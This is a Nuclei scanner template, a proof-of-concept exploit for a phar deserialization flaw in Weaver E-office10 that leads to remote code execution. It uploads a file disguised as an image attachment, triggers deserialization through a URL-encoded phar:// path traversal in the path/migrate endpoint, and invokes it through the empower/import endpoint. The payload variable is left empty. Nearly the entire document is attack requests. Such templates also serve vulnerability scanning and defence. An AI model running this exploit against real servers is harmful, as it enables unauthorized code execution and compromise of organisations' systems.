content:
# Add your nuclei formatted PoC!
id: weaver-e-office10-atuh-file-phar-RCE

info:
  name: weaver-e-office10-atuh-file-phar-RCE
  author: xxx
  severity: high
  description: weaver-e-office10-atuh-file-phar-RCE
  reference:
    - https://
  tags: weaver

variables:
  boundary: "{{rand_base(32)}}"
  code: ""

http:
  - raw:
      - |+
        POST /eoffice10/server/public/api/attachment/atuh-file HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary={{boundary}}

        --{{boundary}}
        Content-Disposition: form-data; name="Filedata"; filename="register.inc"
        Content-Type: image/jpeg

        {{base64_decode("{{code}}")}}
        --{{boundary}}--
      - |
        POST /eoffice10/server/public/api/attachment/path/migrate HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        source_path=&desc_path=%70%68%61%72%3a%2f%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%61%74%74%61%63%68%6d%65%6e%74%2f
      - |
        POST /eoffice10/server/public/api/empower/import HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        type=tttt&file={{attachment_id}}
    extractors:
      - type: json
        part: body_1
        internal: true
        name: attachment_id
        json:
          - '.[] | .attachment_id'
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - system
      - type: status
        status:
          - 200
help: 泛微 E-office10 atuh-file-phar 反序列化
author: Carry
